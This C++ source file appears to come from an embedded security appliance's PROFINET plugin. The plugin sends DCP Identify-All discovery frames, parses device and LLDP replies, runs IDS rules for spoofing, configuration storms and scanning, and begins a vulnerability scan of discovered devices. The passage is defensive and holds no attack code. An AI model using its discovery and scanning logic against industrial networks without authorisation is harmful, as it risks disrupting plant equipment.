#include "profinet_plugin.h"
#include "../security/security_manager.h"
#include "../assessment/fuzzing_engine.h"
#include "../core/reporting_engine.h"
#include "../core/logging_system.h"
#include "../core/configuration_manager.h"
#include "../core/psram_allocator.h"

extern "C" {
#include "lwip/inet.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_timer.h"
}

// Helper function to convert IP string to uint32_t
static inline uint32_t ip_to_uint32(const std::string& ip_str) {
    struct in_addr addr;
    if (inet_aton(ip_str.c_str(), &addr) != 0) {
        return ntohl(addr.s_addr);
    }
    return 0;
}
#include <sstream>
#include "../core/event_formatter.h"
#include <cstring>
#include <random>
#include <algorithm>
#include <iomanip>
#include <map>
#include <cctype>
#include <unordered_map>
#include <unordered_set>

#define TAG_PN "PROFINETPlugin"

// Helper functions from old implementation
static inline void maccpy(uint8_t* d, const uint8_t* s) {
    for(int i=0; i<6; i++) d[i]=s[i];
}

static psram_string mac_to_str(const uint8_t* m) {
    char b[18];
    snprintf(b, sizeof(b), "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
    return PSRAMUtils::createPSRAMString(b);
}

static inline uint16_t be16(const uint8_t* p) {
    return (uint16_t)((p[0]<<8)|p[1]);
}

static inline uint32_t be32(const uint8_t* p) {
    return (uint32_t)((p[0]<<24)|(p[1]<<16)|(p[2]<<8)|p[3]);
}

static uint32_t fnv1a32(const uint8_t* data, size_t len) {
    uint32_t hash = 0x811C9DC5u;
    for (size_t i = 0; i < len; ++i) {
        hash ^= data[i];
        hash *= 0x01000193u;
    }
    return hash;
}

PROFINETPlugin::PROFINETPlugin(EthernetTxIf* eth) : BasePlugin("PROFINETPlugin","0.1", ProtocolType::PROFINET), eth_(eth) {}

bool PROFINETPlugin::initialize(ConfigurationManager* cfg, ReportingEngine* rep) {
    cfg_ = cfg; rep_ = rep;

    // Load configuration from JSON
    if (cfg_) {
        auto prot_cfg = cfg_->getProtocolConfig(ProtocolType::PROFINET);

        // Parse basic settings
        if (prot_cfg.count("enabled")) config_.enabled = (prot_cfg["enabled"] == "true");
        if (prot_cfg.count("dcp_multicast")) config_.dcp_multicast = prot_cfg["dcp_multicast"];
        if (prot_cfg.count("enable_topology_discovery")) config_.enable_topology_discovery = (prot_cfg["enable_topology_discovery"] == "true");
        if (prot_cfg.count("discovery_timeout_ms")) {
            std::string timeout_str = PSRAMUtils::fromPSRAMString(prot_cfg["discovery_timeout_ms"]);
            config_.discovery_timeout_ms = std::stoul(timeout_str);
        }
        // Default patterns (PSRAM)
        if (config_.default_name_patterns.empty()) {
            config_.default_name_patterns.push_back(PSRAMUtils::createPSRAMString("station_"));
            config_.default_name_patterns.push_back(PSRAMUtils::createPSRAMString("new_device"));
            config_.default_name_patterns.push_back(PSRAMUtils::createPSRAMString("simatic"));
            config_.default_name_patterns.push_back(PSRAMUtils::createPSRAMString("plc_"));
        }
        // Security assessment settings
        if (prot_cfg.count("check_default_names")) config_.check_default_names = (prot_cfg["check_default_names"] == "true");
        if (prot_cfg.count("check_security_class")) config_.check_security_class = (prot_cfg["check_security_class"] == "true");
        if (prot_cfg.count("check_unencrypted_comm")) config_.check_unencrypted_comm = (prot_cfg["check_unencrypted_comm"] == "true");

        // IDS settings
        if (prot_cfg.count("detect_dcp_spoofing")) config_.detect_dcp_spoofing = (prot_cfg["detect_dcp_spoofing"] == "true");
        if (prot_cfg.count("detect_config_changes")) config_.detect_config_changes = (prot_cfg["detect_config_changes"] == "true");
        if (prot_cfg.count("detect_topology_changes")) config_.detect_topology_changes = (prot_cfg["detect_topology_changes"] == "true");
        if (prot_cfg.count("max_devices_per_sec")) {
            std::string devices_str = PSRAMUtils::fromPSRAMString(prot_cfg["max_devices_per_sec"]);
            config_.max_devices_per_sec = std::stoul(devices_str);
        }
    }

    // Register PROFINET-specific event extractor with centralized SessionStateMachine
    getSessionStateMachine().registerProtocolCallbacks(
        SessionEventHelpers::extractPROFINETEvent,
        nullptr  // Use default transition validator
    );

    std::string msg = std::string("PROFINETPlugin ready (raw ") + (eth_?"enabled":"disabled") + ", config enabled=" + (config_.enabled?"true":"false") + ")";
    LOG_INFO(TAG_PN, msg.c_str());
    return true;
}

void PROFINETPlugin::shutdown() { LOG_INFO(TAG_PN, "shutdown"); }

bool PROFINETPlugin::buildDcpIdentifyAll(psram_vector<uint8_t>& out) {
    if (!eth_) return false;
    uint8_t src[6] = {0,0,0,0,0,0};
    if (!eth_->getMac(src)) return false;
    const uint8_t dst[6] = {0x01,0x0E,0xCF,0x00,0x00,0x00};
    const uint16_t ethertype = 0x8892; // PROFINET

    // PN-RT header + DCP Identify-All Request:
    // [FrameID 2]=0xFEFE, [ServiceID 1]=0x05 (Identify), [ServiceType 1]=0x00 (Request)
    // [XID 4]=random, [ResponseDelay 2]=0x0005 (50ms units), [DCPDataLen 2]=0x0004
    // Block: [Option 1]=0xFF (All), [Suboption 1]=0xFF (All), [BlockLen 2]=0x0000
    std::random_device rd; std::mt19937 rng(rd()); uint32_t xid = rng();

    uint8_t dcp[2 + 1 + 1 + 4 + 2 + 2 + 1 + 1 + 2];
    size_t off = 0;
    dcp[off++] = 0xFE; dcp[off++] = 0xFE;      // FrameID Identify
    dcp[off++] = 0x05;                         // ServiceID Identify
    dcp[off++] = 0x00;                         // ServiceType Request
    dcp[off++] = (uint8_t)((xid>>24)&0xFF);
    dcp[off++] = (uint8_t)((xid>>16)&0xFF);
    dcp[off++] = (uint8_t)((xid>>8)&0xFF);
    dcp[off++] = (uint8_t)(xid&0xFF);
    dcp[off++] = 0x00; dcp[off++] = 0x05;      // ResponseDelay (50ms steps)
    dcp[off++] = 0x00; dcp[off++] = 0x04;      // DCPDataLen
    dcp[off++] = 0xFF; dcp[off++] = 0xFF;      // Option All / Suboption All
    dcp[off++] = 0x00; dcp[off++] = 0x00;      // BlockLen=0
    (void)off;

    out.resize(14 + sizeof(dcp));
    maccpy(&out[0], dst);
    maccpy(&out[6], src);
    out[12] = (uint8_t)((ethertype>>8)&0xFF);
    out[13] = (uint8_t)(ethertype&0xFF);
    std::memcpy(&out[14], dcp, sizeof(dcp));

    // Pad to minimum Ethernet size if needed (60 bytes without FCS)
    if (out.size() < 60) out.resize(60, 0x00);
    return true;
}

bool PROFINETPlugin::parseDcpResponse(const uint8_t* eth, size_t len, psram_string& out_json_one) {
    out_json_one.clear();
    if (len < 14+2+1+1+4+2+2) return false;
    const uint8_t* p = eth;
    const uint8_t* dst = p+0;
    const uint8_t* src = p+6;
    uint16_t et = (uint16_t)(p[12]<<8 | p[13]);
    if (et != 0x8892) return false;

    const uint8_t* dcp = p + 14;
    size_t remain = len - 14;

    uint16_t frame_id = be16(dcp+0);
    uint8_t service_id = dcp[2];
    uint8_t service_type = dcp[3];
    uint32_t xid = be32(dcp+4);
    uint16_t resp_delay = be16(dcp+8);
    uint16_t dcp_len = be16(dcp+10);
    if (remain < 12 + dcp_len) return false;

    // Only consider Identify responses (service_id=0x05) with response type (>=0x01)
    if (service_id != 0x05 || service_type == 0x00) return false;

    // Parse DCP blocks
    size_t pos = 12;
    std::string name, ip, mask, gw;
    uint16_t vendor_id = 0, device_id = 0;
    while (pos + 4 <= 12 + dcp_len) {
        uint8_t opt = dcp[pos+0];
        uint8_t sub = dcp[pos+1];
        uint16_t blen = be16(dcp+pos+2);
        pos += 4;
        if (pos + blen > 12 + dcp_len) break;

        if (blen < 2) {
            pos += blen;
            if (blen % 2 != 0) pos++;
            continue;
        }

        const uint8_t* b = dcp + pos;
        uint16_t qualifier = be16(b);
        (void)qualifier;
        const uint8_t* payload = b + 2;
        uint16_t payload_len = (uint16_t)(blen - 2);

        // Option 0x02 DeviceProperties
        if (opt == 0x02 && sub == 0x01 && payload_len >= 4) {
            vendor_id = be16(payload+0);
            device_id = be16(payload+2);
        } else if (opt == 0x02 && sub == 0x02 && payload_len >= 1) {
            // NameOfStation (string, padded to even)
            name.assign((const char*)payload, (size_t)payload_len);
            // Trim trailing padding NULs
            while (!name.empty() && (name.back()=='\0' || (uint8_t)name.back()==0x00)) name.pop_back();
        }
        // Option 0x01 IP, Subopt 0x02 = IP parameter (IP, mask, gateway)
        else if (opt == 0x01 && sub == 0x02 && payload_len >= 12) {
            char buf[16];
            snprintf(buf, sizeof(buf), "%u.%u.%u.%u", payload[0],payload[1],payload[2],payload[3]); ip = buf;
            snprintf(buf, sizeof(buf), "%u.%u.%u.%u", payload[4],payload[5],payload[6],payload[7]); mask = buf;
            snprintf(buf, sizeof(buf), "%u.%u.%u.%u", payload[8],payload[9],payload[10],payload[11]); gw = buf;
        }
        // Other blocks ignored
        pos += blen;
        // Each block is padded to even 2-byte boundaries - DCP len accounts for this already.
    }

    psram_string json = PSRAMUtils::createPSRAMString("{");
    json += PSRAMUtils::createPSRAMString("\"pn_dcp\":true");
    char numbuf[64];
    snprintf(numbuf, sizeof(numbuf), ",\"frame_id\":%u", frame_id); json += PSRAMUtils::createPSRAMString(numbuf);
    snprintf(numbuf, sizeof(numbuf), ",\"service_id\":%u", (unsigned)service_id); json += PSRAMUtils::createPSRAMString(numbuf);
    snprintf(numbuf, sizeof(numbuf), ",\"service_type\":%u", (unsigned)service_type); json += PSRAMUtils::createPSRAMString(numbuf);
    snprintf(numbuf, sizeof(numbuf), ",\"xid\":%lu", (unsigned long)xid); json += PSRAMUtils::createPSRAMString(numbuf);
    snprintf(numbuf, sizeof(numbuf), ",\"resp_delay\":%u", (unsigned)resp_delay); json += PSRAMUtils::createPSRAMString(numbuf);
    psram_string sm = mac_to_str(src);
    psram_string dm = mac_to_str(dst);
    json += PSRAMUtils::createPSRAMString(",\"src_mac\":\""); json += sm; json += PSRAMUtils::createPSRAMString("\"");
    json += PSRAMUtils::createPSRAMString(",\"dst_mac\":\""); json += dm; json += PSRAMUtils::createPSRAMString("\"");
    if (!name.empty()) {
        json += PSRAMUtils::createPSRAMString(",\"name\":\"");
        for (char c: name) { if (c=='\"') json += PSRAMUtils::createPSRAMString("\\"); json.push_back(c); }
        json += PSRAMUtils::createPSRAMString("\"");
    }
    if (!ip.empty())   { json += PSRAMUtils::createPSRAMString(",\"ip\":\"");   json += PSRAMUtils::createPSRAMString(ip.c_str());   json += PSRAMUtils::createPSRAMString("\""); }
    if (!mask.empty()) { json += PSRAMUtils::createPSRAMString(",\"mask\":\""); json += PSRAMUtils::createPSRAMString(mask.c_str()); json += PSRAMUtils::createPSRAMString("\""); }
    if (!gw.empty())   { json += PSRAMUtils::createPSRAMString(",\"gw\":\"");   json += PSRAMUtils::createPSRAMString(gw.c_str());   json += PSRAMUtils::createPSRAMString("\""); }
    if (vendor_id || device_id) {
        snprintf(numbuf, sizeof(numbuf), ",\"device_id\":{\"vendor\":%u,\"device\":%u}", vendor_id, device_id);
        json += PSRAMUtils::createPSRAMString(numbuf);
    }
    json += PSRAMUtils::createPSRAMString("}");
    out_json_one = json;
    return true;
}

static inline void mac_to_str18(const uint8_t mac[6], char out[18]) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static inline bool is_printable_ascii(const uint8_t* p, size_t n) {
    if (!p || n == 0) return false;
    for (size_t i = 0; i < n; ++i) {
        uint8_t c = p[i];
        if (c < 0x20 || c > 0x7E) return false;
    }
    return true;
}

static inline void bytes_to_hex(char* out, size_t out_sz, const uint8_t* p, size_t n) {
    if (!out || out_sz == 0) return;
    if (!p || n == 0) { out[0] = '\0'; return; }
    static const char* hexd = "0123456789ABCDEF";
    size_t w = 0;
    for (size_t i = 0; i < n; ++i) {
        if (w + 2 >= out_sz) break;
        uint8_t v = p[i];
        out[w++] = hexd[(v >> 4) & 0xF];
        out[w++] = hexd[v & 0xF];
        if (i + 1 < n) {
            if (w + 1 >= out_sz) break;
            out[w++] = ':';
        }
    }
    out[w] = '\0';
}

static inline void record_dcp_block(PROFINETDeviceInfo& dev,
                                    uint8_t option, uint8_t suboption,
                                    uint16_t qualifier,
                                    const uint8_t* payload, uint16_t payload_len) {
    if (dev.dcp_blocks_count >= (uint8_t)(sizeof(dev.dcp_blocks) / sizeof(dev.dcp_blocks[0]))) return;
    auto& b = dev.dcp_blocks[dev.dcp_blocks_count++];
    b.option = option;
    b.suboption = suboption;
    b.qualifier = qualifier;
    b.payload_len = payload_len;
    b.payload_hash = (payload && payload_len) ? fnv1a32(payload, payload_len) : 0;
    const size_t cp = (payload && payload_len) ? (payload_len < sizeof(b.preview) ? payload_len : sizeof(b.preview)) : 0;
    if (cp) memcpy(b.preview, payload, cp);
    if (cp < sizeof(b.preview)) memset(b.preview + cp, 0, sizeof(b.preview) - cp);
}

void PROFINETPlugin::handleLldpFrame(const NetworkPacket& pkt) {
    if (!config_.enable_topology_discovery) return;
    if (!pkt.data || pkt.length < 2) return;

    // LLDPDU TLVs: [type(7)|len(9)] big-endian, then len bytes payload, terminated by type=0,len=0.
    LldpInfo info{};
    info.last_seen_ms = pkt.ts_ms;

    const uint8_t* p = pkt.data;
    size_t rem = pkt.length;
    while (rem >= 2) {
        uint16_t hdr = rd16be(p);
        uint8_t tlv_type = (uint8_t)((hdr >> 9) & 0x7F);
        uint16_t tlv_len = (uint16_t)(hdr & 0x01FF);
        p += 2;
        rem -= 2;
        if (tlv_len > rem) break;
        const uint8_t* v = p;

        if (tlv_type == 0 && tlv_len == 0) {
            break;
        } else if (tlv_type == 1 && tlv_len >= 2) { // Chassis ID
            uint8_t subtype = v[0];
            const uint8_t* id = v + 1;
            size_t id_len = tlv_len - 1;
            if (subtype == 4 && id_len == 6) { // MAC
                char macs[18]; mac_to_str18(id, macs);
                strncpy(info.chassis_id, macs, sizeof(info.chassis_id));
                info.chassis_id[sizeof(info.chassis_id) - 1] = '\0';
            } else if (is_printable_ascii(id, id_len)) {
                size_t cp = id_len < sizeof(info.chassis_id) - 1 ? id_len : sizeof(info.chassis_id) - 1;
                memcpy(info.chassis_id, id, cp);
                info.chassis_id[cp] = '\0';
            } else {
                bytes_to_hex(info.chassis_id, sizeof(info.chassis_id), id, id_len < 16 ? id_len : 16);
            }
        } else if (tlv_type == 2 && tlv_len >= 2) { // Port ID
            const uint8_t* id = v + 1;
            size_t id_len = tlv_len - 1;
            if (is_printable_ascii(id, id_len)) {
                size_t cp = id_len < sizeof(info.port_id) - 1 ? id_len : sizeof(info.port_id) - 1;
                memcpy(info.port_id, id, cp);
                info.port_id[cp] = '\0';
            } else {
                bytes_to_hex(info.port_id, sizeof(info.port_id), id, id_len < 16 ? id_len : 16);
            }
        } else if (tlv_type == 3 && tlv_len == 2) { // TTL
            info.ttl = rd16be(v);
        } else if (tlv_type == 4 && tlv_len > 0) { // Port Description
            size_t cp = tlv_len < sizeof(info.port_desc) - 1 ? tlv_len : sizeof(info.port_desc) - 1;
            memcpy(info.port_desc, v, cp);
            info.port_desc[cp] = '\0';
        } else if (tlv_type == 5 && tlv_len > 0) { // System Name
            size_t cp = tlv_len < sizeof(info.system_name) - 1 ? tlv_len : sizeof(info.system_name) - 1;
            memcpy(info.system_name, v, cp);
            info.system_name[cp] = '\0';
        } else if (tlv_type == 6 && tlv_len > 0) { // System Description
            size_t cp = tlv_len < sizeof(info.system_desc) - 1 ? tlv_len : sizeof(info.system_desc) - 1;
            memcpy(info.system_desc, v, cp);
            info.system_desc[cp] = '\0';
        } else if (tlv_type == 8 && tlv_len >= 1) { // Management Address (keep a lightweight preview)
            // Wireshark-style: address string is non-trivial; keep first bytes as hex for now.
            bytes_to_hex(info.mgmt_addr, sizeof(info.mgmt_addr), v, tlv_len < 16 ? tlv_len : 16);
        } else if (tlv_type == 127 && tlv_len >= 4) { // Organization specific
            // OUI 00-0E-CF is PROFINET (PI).
            if (v[0] == 0x00 && v[1] == 0x0E && v[2] == 0xCF) {
                info.has_profinet_org = true;
                info.profinet_subtype = v[3];
                if (tlv_len > 4) {
                    info.profinet_payload_hash = fnv1a32(v + 4, tlv_len - 4);
                }
            }
        }

        p += tlv_len;
        rem -= tlv_len;
    }

    const uint64_t key = macToKey(pkt.src_mac);
    std::lock_guard<std::mutex> lk(topo_mutex_);
    lldp_by_mac_[key] = info;
}

bool PROFINETPlugin::isPacketWriter(const NetworkPacket& pkt) const {
    // L2 capture path provides pkt.data starting at the PROFINET payload (FrameID at offset 0).
    if (pkt.ether_type != htons(0x8892) || !pkt.data || pkt.length < 4) return false;
    const uint8_t service_id = pkt.data[2];
    const uint8_t service_type = pkt.data[3];
    // DCP Set operations: ServiceID 0x04 (Set), ServiceType 0x00 (Request)
    return (service_id == PROFINET::DCP_SERVICE_SET && service_type == PROFINET::DCP_REQUEST);
}

bool checkPROFINET(uint32_t now_ms, uint32_t src, uint32_t dst, uint8_t service_id) {
    return true;
}

bool PROFINETPlugin::isTargetPacket(const NetworkPacket& packet) {
    // PROFINET DCP packets use EtherType 0x8892
    return packet.ether_type == htons(0x8892);
}

// ==================== PHASE 6: PROFINET IDS Rules Implementation ====================

bool PROFINETPlugin::doPacketAnalysis(const NetworkPacket& pkt) {
    const uint8_t* b = pkt.data;
    const size_t n = pkt.length;
    if (!b || n < 2) return false;

    const bool discovery_mode = discovery_active_.load(std::memory_order_relaxed);

    // LLDP is not PROFINET-DCP, but is commonly used for PROFINET topology/neighbor data.
    if (pkt.ether_type == htons(0x88CC)) {
        handleLldpFrame(pkt);
        return false;
    }

    // Only process PROFINET DCP/RT frames (EtherType 0x8892).
    if (pkt.ether_type != htons(0x8892)) return false;

    // ===== FLOW MANAGEMENT: track packet in the flow tracker =====
    trackPacketInFlow(pkt);

    if (n < 12) return false; // Minimum DCP header

    // If an active discovery window is running, capture some diagnostics.
    if (discovery_mode) {
        discovery_rx_frames_.fetch_add(1, std::memory_order_relaxed);
        const uint16_t fid = rd16be(b + 0);
        discovery_last_frame_id_.store(fid, std::memory_order_relaxed);
        const uint8_t sid = b[2];
        const uint8_t st = b[3];
        if (sid == PROFINET::DCP_SERVICE_IDENTIFY && st >= PROFINET::DCP_RESPONSE_SUCCESS) {
            discovery_rx_identify_.fetch_add(1, std::memory_order_relaxed);
        }
    }

    char src_mac_str[18];
    mac_to_str18(pkt.src_mac, src_mac_str);
    const uint64_t src_key = macToKey(pkt.src_mac);
    const uint32_t now_sec = (uint32_t)(pkt.ts_ms / 1000ULL);

    bool alert_generated = false;

    const uint16_t frame_id = PROFINETPlugin::rd16be(b + 0);

    // Real-Time frames: handle before DCP checks
    if (frame_id >= 0xC000 && frame_id <= 0xFAFF) {
        bool rt_alert = processRtFrame(pkt, frame_id, false);
        if (rt_alert) ids_events_++;
        return rt_alert;
    }
    if (frame_id >= 0x0100 && frame_id <= 0x0FFF) {
        bool rt_alert = processRtFrame(pkt, frame_id, true);
        if (rt_alert) ids_events_++;
        return rt_alert;
    }

    // DCP frames: 0xFEFC..0xFEFF (Identify request/response variants).
    if (frame_id < 0xFEFC || frame_id > 0xFEFF) return false;

    const uint8_t service_id = b[2];
    const uint8_t service_type = b[3];
    // Qualify helpers to avoid any accidental name collision with other headers.
    const uint32_t xid = PROFINETPlugin::rd32be(b + 4);
    const uint16_t dcp_data_len = PROFINETPlugin::rd16be(b + 10);

    // Rule 1: Malformed DCP packet detection
    if (dcp_data_len > (uint16_t)(n - 12)) {
        char msg[192];
        snprintf(msg, sizeof(msg),
                 "{\"alert_type\":\"profinet_malformed\",\"type\":\"profinet_malformed\",\"src_mac\":\"%s\",\"detail\":\"DCP data length (%u) exceeds packet size (%u)\",\"severity\":\"HIGH\"}",
                 src_mac_str, (unsigned)dcp_data_len, (unsigned)n);
        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
        alert_generated = true;
    }

    // Rule 2: DCP Spoofing detection - excessive Identify responses
    if (service_id == PROFINET::DCP_SERVICE_IDENTIFY && service_type >= PROFINET::DCP_RESPONSE_SUCCESS) {
        static psram_map<uint64_t, uint32_t> identify_responses;
        static psram_map<uint64_t, uint32_t> response_time;

        identify_responses[src_key]++;
        if (response_time[src_key] && (now_sec - response_time[src_key]) > 30) {
            identify_responses[src_key] = 1;
        }
        if (identify_responses[src_key] > 20) {
            char msg[200];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"profinet_identify_flood\",\"type\":\"profinet_identify_flood\",\"src_mac\":\"%s\",\"responses\":%lu,\"window\":\"30s\",\"severity\":\"CRITICAL\"}",
                     src_mac_str, (unsigned long)identify_responses[src_key]);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
            alert_generated = true;
        }
        response_time[src_key] = now_sec;
    }

    // Rule 3: Configuration changes (Set operations) monitoring
    if (service_id == PROFINET::DCP_SERVICE_SET && service_type == PROFINET::DCP_REQUEST) {
        static psram_map<uint64_t, uint32_t> config_changes;
        static psram_map<uint64_t, uint32_t> config_time;

        config_changes[src_key]++;
        if (config_time[src_key] && (now_sec - config_time[src_key]) > 120) {
            config_changes[src_key] = 1;
        }
        if (config_changes[src_key] > 5) {
            char msg[220];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"profinet_config_storm\",\"type\":\"profinet_config_storm\",\"src_mac\":\"%s\",\"changes\":%lu,\"window\":\"120s\",\"severity\":\"CRITICAL\",\"action\":\"Multiple DCP Set operations\"}",
                     src_mac_str, (unsigned long)config_changes[src_key]);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
            alert_generated = true;
        } else {
            char msg[160];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"profinet_set_operation\",\"type\":\"profinet_set_operation\",\"src_mac\":\"%s\",\"severity\":\"MEDIUM\"}",
                     src_mac_str);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
            alert_generated = true;
        }
        config_time[src_key] = now_sec;
    }

    // Rule 4: Reconnaissance detection - excessive Get operations
    if (service_id == PROFINET::DCP_SERVICE_GET && service_type == PROFINET::DCP_REQUEST) {
        static psram_map<uint64_t, uint32_t> get_operations;
        static psram_map<uint64_t, uint32_t> get_time;

        get_operations[src_key]++;
        if (get_time[src_key] && (now_sec - get_time[src_key]) > 60) {
            get_operations[src_key] = 1;
        }
        if (get_operations[src_key] > 15) {
            char msg[220];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"profinet_scanning\",\"type\":\"profinet_scanning\",\"src_mac\":\"%s\",\"operations\":%lu,\"window\":\"60s\",\"severity\":\"HIGH\"}",
                     src_mac_str, (unsigned long)get_operations[src_key]);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
            alert_generated = true;
        }
        get_time[src_key] = now_sec;
    }

    // Rule 5: Hello message flooding detection (topology manipulation)
    if (service_id == PROFINET::DCP_SERVICE_HELLO) {
        static psram_map<uint64_t, uint32_t> hello_count;
        static psram_map<uint64_t, uint32_t> hello_time;

        hello_count[src_key]++;
        if (hello_time[src_key] && (now_sec - hello_time[src_key]) > 60) {
            hello_count[src_key] = 1;
        }
        if (hello_count[src_key] > 30) {
            char msg[240];
            snprintf(msg, sizeof(msg),
                     "{\"alert_type\":\"profinet_hello_flood\",\"type\":\"profinet_hello_flood\",\"src_mac\":\"%s\",\"messages\":%lu,\"window\":\"60s\",\"severity\":\"HIGH\",\"detail\":\"Potential topology manipulation\"}",
                     src_mac_str, (unsigned long)hello_count[src_key]);
            reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
            alert_generated = true;
        }
        hello_time[src_key] = now_sec;
    }

    // Rule 6: Suspicious XID patterns (potential replay/fuzzing)
    static psram_map<uint64_t, uint32_t> last_xid;
    if (last_xid.count(src_key) && xid == last_xid[src_key]) {
        char msg[220];
        snprintf(msg, sizeof(msg),
                 "{\"alert_type\":\"profinet_xid_reuse\",\"type\":\"profinet_xid_reuse\",\"src_mac\":\"%s\",\"xid\":%lu,\"severity\":\"MEDIUM\",\"detail\":\"Transaction ID reused\"}",
                 src_mac_str, (unsigned long)xid);
        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::WARNING);
        alert_generated = true;
    }
    last_xid[src_key] = xid;

    // Rule 7: Overall traffic flooding detection
    static psram_map<uint64_t, uint32_t> total_packets;
    static psram_map<uint64_t, uint32_t> packet_time;

    total_packets[src_key]++;
    if (packet_time[src_key] && (now_sec - packet_time[src_key]) > 60) {
        total_packets[src_key] = 1;
    }
    if (total_packets[src_key] > 100) {
        char msg[220];
        snprintf(msg, sizeof(msg),
                 "{\"alert_type\":\"profinet_flooding\",\"type\":\"profinet_flooding\",\"src_mac\":\"%s\",\"packets\":%lu,\"window\":\"60s\",\"severity\":\"CRITICAL\"}",
                 src_mac_str, (unsigned long)total_packets[src_key]);
        reportIntrusionPSRAM(pkt, PSRAMUtils::createPSRAMString(msg), LogLevel::ERROR);
        alert_generated = true;
    }
    packet_time[src_key] = now_sec;

    // Identify responses: parse and feed discovery window + signature/sync checks.
    if (service_id == PROFINET::DCP_SERVICE_IDENTIFY && service_type >= PROFINET::DCP_RESPONSE_SUCCESS) {
        size_t dcp_total_len = (size_t)12 + (size_t)dcp_data_len;
        if (dcp_total_len <= n) {
            PROFINETDeviceInfo dev_info;
            if (parseDcpIdentifyResponse(b, dcp_total_len, dev_info)) {
                if (discovery_mode) {
                    discovery_parse_ok_.fetch_add(1, std::memory_order_relaxed);
                }
                // If an active discovery window is running, capture the device info for identifyAll().
                {
                    std::lock_guard<std::mutex> lk(discovery_mutex_);
                    if (discovery_active_.load(std::memory_order_relaxed)) {
                        PROFINETDeviceInfo stored = dev_info;
                        maccpy(stored.mac_address, pkt.src_mac);
                        const uint64_t key = macToKey(pkt.src_mac);
                        if (discovery_keys_.insert(key).second) {
                            discovery_devices_.push_back(stored);
                        }
                    }
                }

                // During an active discovery window we must stay lightweight: avoid emitting vulnerability events
                // or doing heavy signature/sync reporting on net_ana (core 1), otherwise the web server can stall.
                if (!discovery_mode) {
                    if (evaluateDeviceSignature(dev_info, pkt.src_mac, pkt)) alert_generated = true;
                    if (updateSyncStateFromIdentify(dev_info, pkt.src_mac, pkt)) alert_generated = true;
                }
            } else {
                if (discovery_mode) {
                    discovery_parse_fail_.fetch_add(1, std::memory_order_relaxed);
                }
            }
        }
    }

    if (alert_generated) ids_events_++;
    return alert_generated;
}

std::string PROFINETPlugin::doVulnerabilityScan(const std::string& target) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target.c_str());
    psram_string report_ps;
    if (!doVulnerabilityScanPSRAM(target_ps, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool PROFINETPlugin::doVulnerabilityScanPSRAM(const psram_string& target,
                                              psram_string& out_report) {
    std::string legacy_target = PSRAMUtils::fromPSRAMString(target);
    std::string legacy_report = legacyDoVulnerabilityScan(legacy_target);
    if (legacy_report.empty()) {
        out_report.clear();
        return false;
    }
    out_report = PSRAMUtils::createPSRAMString(legacy_report.c_str());
    return true;
}

std::string PROFINETPlugin::legacyDoVulnerabilityScan(const std::string& target) {
    if (!config_.enabled) {
        LOG_INFO(TAG_PN, "PROFINET plugin disabled, skipping scan");
        return "";  // Empty string = scan failed (plugin disabled)
    }

    // Optional scan arg wrapper from VulnerabilityScanner:
    // {"target":"broadcast","scan_types":["dcp_identify_all","security_class",...]}
    std::string target_label = target;
    std::vector<std::string> scan_types;
    uint32_t timeout_ms = config_.discovery_timeout_ms ? config_.discovery_timeout_ms : 1500U;

    if (!target.empty() && target[0] == '{') {
        cJSON* root = cJSON_Parse(target.c_str());
        if (root) {
            if (auto v = cJSON_GetObjectItem(root, "target"); v && cJSON_IsString(v) && v->valuestring) {
                target_label = v->valuestring;
            }
            if (auto v = cJSON_GetObjectItem(root, "timeout_ms"); v && cJSON_IsNumber(v)) {
                double d = v->valuedouble;
                if (d < 200) d = 200;
                if (d > 15000) d = 15000;
                timeout_ms = (uint32_t)d;
            }
            if (auto arr = cJSON_GetObjectItem(root, "scan_types"); arr && cJSON_IsArray(arr)) {
                cJSON* it = nullptr;
                cJSON_ArrayForEach(it, arr) {
                    if (it && cJSON_IsString(it) && it->valuestring) {
                        scan_types.emplace_back(it->valuestring);
                    }
                }
            }
            cJSON_Delete(root);
        }
    }

    auto wants = [&](const char* id) -> bool {
        if (!id) return false;
        if (scan_types.empty()) return true;
        for (auto const& s : scan_types) {
            if (s == id) return true;
        }
        return false;
    };

    const uint64_t t0_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    std::string devices_json = "[]";
    psram_vector<PROFINETDeviceInfo> devices;
    bool identify_ok = false;

    if (wants("dcp_identify_all")) {
        identify_ok = identifyAll(devices_json, timeout_ms);
        // Copy discovered devices captured by doPacketAnalysis() during the discovery window.
        {
            std::lock_guard<std::mutex> lk(discovery_mutex_);
            devices.assign(discovery_devices_.begin(), discovery_devices_.end());
        }
    }

    // Findings (JSON objects as strings)
    psram_string_vector findings;
    PSRAMAllocator<psram_string> alloc;
    findings = psram_string_vector(alloc);

    uint32_t sev_critical = 0, sev_high = 0, sev_medium = 0, sev_low = 0, sev_info = 0;

    auto bump = [&](const char* sev) {
        if (!sev) return;
        if (strcmp(sev, "CRITICAL") == 0) sev_critical++;
        else if (strcmp(sev, "HIGH") == 0) sev_high++;
        else if (strcmp(sev, "MEDIUM") == 0) sev_medium++;
        else if (strcmp(sev, "LOW") == 0) sev_low++;
        else sev_info++;
    };

    psram_string target_ps = PSRAMUtils::createPSRAMString(target_label.c_str());

    if (identify_ok) {
        for (auto const& dev : devices) {
            psram_string finding;

            if (wants("digital_signature") && checkDigitalSignature(dev, finding)) {
                findings.push_back(finding);
